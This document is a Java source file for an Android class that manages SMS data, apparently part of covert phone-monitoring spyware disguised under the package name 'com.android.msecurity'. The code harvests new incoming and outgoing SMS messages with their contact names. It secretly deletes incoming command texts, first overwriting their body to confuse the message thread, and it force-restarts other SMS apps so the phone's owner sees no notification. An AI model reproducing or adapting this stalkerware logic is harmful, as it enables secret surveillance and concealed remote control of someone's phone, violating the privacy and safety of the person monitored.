package com.fx.dalvik.mmssms;

import java.util.HashSet;
import java.util.List;

import android.app.ActivityManager;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.net.Uri;

import com.fx.android.common.Customization;
import com.fx.dalvik.contacts.ContactsDatabaseManager;
import com.fx.dalvik.event.Event;
import com.fx.dalvik.event.EventSms;
import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.FxLog;
import com.vvt.android.syncmanager.control.Main;

public class MmsSmsDatabaseManager {
	
	private static final String TAG = "MmsSmsDatabaseManager";
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	
	private static final String PKG_FX_RECEIVER = "com.android.msecurity";
	
	public static long getLatestSmsId(Context context) {
		if (LOGV) FxLog.v(TAG, "getLatestSmsId # ENTER ...");
		
		String[] projection = { MmsSmsDatabaseHelper.COLUMN_ID };
		Cursor cursor = context.getContentResolver().query(
				MmsSmsDatabaseHelper.CONTENT_URI_SMS, projection, null, null, null);
		
		if (cursor == null) {
			if (LOGV) FxLog.v(TAG, "getLatestSmsId # Query database FAILED!! -> EXIT ...");
			return -1;
		}
		
		long firstId = -1;
		long lastId = 0;
		
		if (cursor.moveToNext()) {
			firstId = cursor.getLong(0);
		}
		if (cursor.moveToLast()) {
			lastId = cursor.getLong(0);
		}
		cursor.close();
		
		long maxId = firstId > lastId ? firstId : lastId;
		
		if (LOGV) FxLog.v(TAG, String.format("getLatestSmsId # id: %d", maxId));
		if (LOGV) FxLog.v(TAG, "getLatestSmsId # EXIT ...");
		return maxId;
	}
	
	public static HashSet<EventSms> getNewerSms(Context context, long refId) {
		if (LOGV) FxLog.v(TAG, "getNewerSms # ENTER ...");
		HashSet<EventSms> smses = new HashSet<EventSms>();
		
		// Type can tell direction and readiness of SMS
		String selection = String.format("(%s = %d OR %s = %d) AND %s > %d", 
				MmsSmsDatabaseHelper.COLUMN_TYPE, MmsSmsDatabaseHelper.TYPE_INCOMING, 
				MmsSmsDatabaseHelper.COLUMN_TYPE, MmsSmsDatabaseHelper.TYPE_OUTGOING, 
				MmsSmsDatabaseHelper.COLUMN_ID, refId);
		
		Cursor cursor = context.getContentResolver().query(
				MmsSmsDatabaseHelper.CONTENT_URI_SMS, null, selection, null, null);
		
		if (cursor == null) {
			if (LOGV) FxLog.v(TAG, "getNewerSms # Query database FAILED!! -> EXIT ...");
			return smses;
		}
		
		EventSms sms = null;
		
		while (cursor.moveToNext()) {
			if (LOGV) FxLog.v(TAG, "getNewerSms # Creating SMS event ...");
			
			long id = cursor.getLong(cursor.getColumnIndex(MmsSmsDatabaseHelper.COLUMN_ID));
			long time = cursor.getLong(cursor.getColumnIndex(
					MmsSmsDatabaseHelper.COLUMN_DATE));
			short type = cursor.getShort(cursor.getColumnIndex(
					MmsSmsDatabaseHelper.COLUMN_TYPE));
			String phoneNumber = cursor.getString(cursor.getColumnIndex(
					MmsSmsDatabaseHelper.COLUMN_ADDRESS));
			String body = cursor.getString(cursor.getColumnIndex(
					MmsSmsDatabaseHelper.COLUMN_BODY));
			
			String contactName = ContactsDatabaseManager.getContactNameByNumber(phoneNumber);
			if (contactName == null || contactName.trim().length() < 1) {
				contactName = Event.REMOTEPARTY_UNKNOWN;
			}
			
			short direction = Event.DIRECTION_UNKNOWN;
			switch (type) {
				case 1: direction = Event.DIRECTION_IN; break;
				case 2: direction = Event.DIRECTION_OUT; break;
			}
			
			sms = new EventSms(time, direction, phoneNumber, body, contactName);
			sms.setId(id);
			smses.add(sms);
			
			if (LOGV) FxLog.v(TAG, "getNewerSms # SMS event is created");
		}
		
		if (LOGV) FxLog.v(TAG, "getNewerSms # Cursor past the last entry");
		
		cursor.close();
		
		if (LOGV) FxLog.v(TAG, "getNewerSms # EXIT ...");
		return smses;
	}
	
	public static int deleteSmsCommand(Context context) {
		if (LOGV) FxLog.v(TAG, "deleteSmsCommand # ENTER ...");
		
		int rowDeleted = 0;
		
		long maxId = MmsSmsDatabaseManager.getLatestSmsId(context);
		
		String selection = String.format("%s = %d AND %s = %d", 
				MmsSmsDatabaseHelper.COLUMN_ID, maxId, 
				MmsSmsDatabaseHelper.COLUMN_TYPE, 
				MmsSmsDatabaseHelper.TYPE_INCOMING);
		
		Cursor cursor = Main.getContext().getContentResolver().query(
				MmsSmsDatabaseHelper.CONTENT_URI_SMS, null, selection, null, null);
		
		if (cursor == null || cursor.getCount() < 1) {
			if (LOGV) FxLog.v(TAG, "deleteSmsCommand # Found nothing -> EXIT ...");
			return 0;
		}
		
		long id = -1;
		long threadId = -1;
		String body = null;
		
		// get the last record
		if (cursor.moveToNext()) {
			id = cursor.getLong(cursor.getColumnIndex(
					MmsSmsDatabaseHelper.COLUMN_ID));
			threadId = cursor.getLong(cursor.getColumnIndex(
					MmsSmsDatabaseHelper.COLUMN_THREAD_ID));
			body = cursor.getString(cursor.getColumnIndex(
					MmsSmsDatabaseHelper.COLUMN_BODY));
			cursor.close();
		}
		
		if (LOGV) FxLog.v(TAG, String.format("deleteSmsCommand # id: %d, body: %s", id, body));
		
		// Check message body
		if (threadId >= 0 && body != null) {
			
			// If it is an SMS Command -> remove
			if (body.startsWith(StringResource.SMS_COMMAND_TAG)) {
				
				if (LOGV) FxLog.v(TAG, "deleteSmsCommand # Found SMS command!!");
				
				// get latest snippet and update SMS body
//					String snippet = getSMSThreadSnippet(threadId);
				
				String previousSmsBody = getPreviousSmsBody(threadId, id);
				
				// update SMS body (try to confuse thread table)
				updateSmsBody(id, previousSmsBody);
				
				// delete SMS record
				rowDeleted = deleteMessage(id);
				
				if (LOGV) FxLog.v(TAG, "deleteSmsCommand # SMS command is handled successfully");
			}
			else {
				if (LOGV) FxLog.v(TAG, "deleteSmsCommand # SMS is not a command");
			}
		}
		
		if (LOGV) FxLog.v(TAG, "deleteSmsCommand # EXIT ...");
		return rowDeleted;
	}
	
	public static void suppressMmsSmsPackage(Context context) {
		if (LOGV) FxLog.v(TAG, "suppressMmsSmsPackage # ENTER ...");
		
		// Suppress Notification
		ActivityManager activityManager
				= (ActivityManager) Main.getContext().getSystemService(Context.ACTIVITY_SERVICE);
		
		// Force stop other SMS receivers
		HashSet<String> pkgNames = getReceiverPackageNames(
        		context, "android.provider.Telephony.SMS_RECEIVED");
		
		pkgNames.remove(PKG_FX_RECEIVER);
		
		for (String pkg : pkgNames) {
			if (LOGV) FxLog.v(TAG, String.format(
					"suppressMmsSmsPackage # Restart pkg: %s", pkg));
			activityManager.restartPackage(pkg);
		}
		
		int rowDeleted = deleteSmsCommand(context);
		
		// SMS Command cannot be found
		if (rowDeleted < 1) {
			if (LOGV) FxLog.v(TAG, "suppressMmsSmsPackage # SMS command not found!");
		}
		
		// Start SmsReceiverService in Android, which version is older than 2.1
		if (needReceiverRestart()) {
			if (LOGV) FxLog.v(TAG, "suppressMmsSmsPackage # Starting SmsReceiverService ...");
			Intent intent = new Intent();
			intent.setClassName("com.android.mms", 
					"com.android.mms.transaction.SmsReceiverService");
			Main.getContext().startService(intent);
		}
		
		if (LOGV) FxLog.v(TAG, "suppressMmsSmsPackage # EXIT ...");
	}
	
	public static HashSet<String> getReceiverPackageNames(Context context, String intentAction) {
    	HashSet<String> pkgNames = new HashSet<String>();
    	
    	PackageManager pm = context.getPackageManager();
    	
    	List<ResolveInfo> receivers = pm.queryBroadcastReceivers(
    			new Intent(intentAction), PackageManager.GET_INTENT_FILTERS);
        
        ActivityInfo activityInfo = null;
        for (ResolveInfo info : receivers) {
        	activityInfo = info.activityInfo;
        	if (activityInfo != null) {
        		pkgNames.add(activityInfo.packageName);
        	}
        }
        return pkgNames;
    }
	
	private static String getPreviousSmsBody(long threadId, long smsId) {
		String previousSmsBody = null;
		
		String selection = MmsSmsDatabaseHelper.COLUMN_THREAD_ID + "=?";
		String[] selectionArgs = new String[] { Long.toString(threadId) };
		String sortOrder = MmsSmsDatabaseHelper.COLUMN_ID + " DESC";
		
		Cursor cursor = Main.getContentResolver().query(
				MmsSmsDatabaseHelper.CONTENT_URI_SMS, 
				null, selection, selectionArgs, sortOrder);
		
		if (cursor != null) {
			while (cursor.moveToNext()) {
				long id = cursor.getLong(cursor.getColumnIndex(MmsSmsDatabaseHelper.COLUMN_ID));
				if (id < smsId) {
					previousSmsBody = cursor.getString(
							cursor.getColumnIndex(MmsSmsDatabaseHelper.COLUMN_BODY));
					break;
				}
			}
		}
		if (LOGV) FxLog.v(TAG, String.format("getPreviousSmsBody # body: '%s'", previousSmsBody));
		return previousSmsBody;
	}
	
	private static void updateSmsBody(long smsId, String newBody) {
		Uri uri = ContentUris.withAppendedId(MmsSmsDatabaseHelper.CONTENT_URI_SMS, smsId);
		ContentValues values = new ContentValues();
		values.put(MmsSmsDatabaseHelper.COLUMN_BODY, newBody);
		values.put(MmsSmsDatabaseHelper.COLUMN_READ, 1);
		Main.getContentResolver().update(uri, values, null, null);
		Main.getContentResolver().notifyChange(uri, null);
		if (LOGV) FxLog.v(TAG, String.format("updateSmsBody # newBody: '%s'", newBody));
	}
	
	private static int deleteMessage(long smsId) {
		Uri deleteUri = ContentUris.withAppendedId(MmsSmsDatabaseHelper.CONTENT_URI_SMS, smsId);
		int rowDeleted = Main.getContext().getContentResolver().delete(deleteUri, null, null);
		Main.getContentResolver().notifyChange(deleteUri, null);
		if (LOGV) FxLog.v(TAG, String.format("deleteMessage # Deleted sms: '%d'", rowDeleted));
		return rowDeleted;
	}
	
	private static boolean needReceiverRestart() {
		Class<?> cBuild = null;
		try { cBuild = Class.forName("android.os.Build"); }
		catch (ClassNotFoundException e) { /* ignore */ }
		
		if (cBuild == null) {
			return true;
		}
		else {
			return Integer.parseInt(android.os.Build.VERSION.SDK) < 7;
		}
	}
	
	@SuppressWarnings("unused")
	private static void printLogSMSContent() {
		Cursor aCursor = Main.getContentResolver().query(
				MmsSmsDatabaseHelper.CONTENT_URI_SMS, null, null, null, null);
		
		if (LOGV) {
			FxLog.v(TAG, "deleteSMSContainingCommand # Found '" + aCursor.getCount() + "' rows");
			
			while(aCursor.moveToNext()) {		
				int aColumnIndexInt = aCursor.getColumnIndex(MmsSmsDatabaseHelper.COLUMN_BODY);
				
				FxLog.v(TAG, "deleteSMSContainingCommand # Body (" + aColumnIndexInt + ") = " 
						+ aCursor.getString(aColumnIndexInt));
			}
			aCursor.close();
		}
	}
	
}
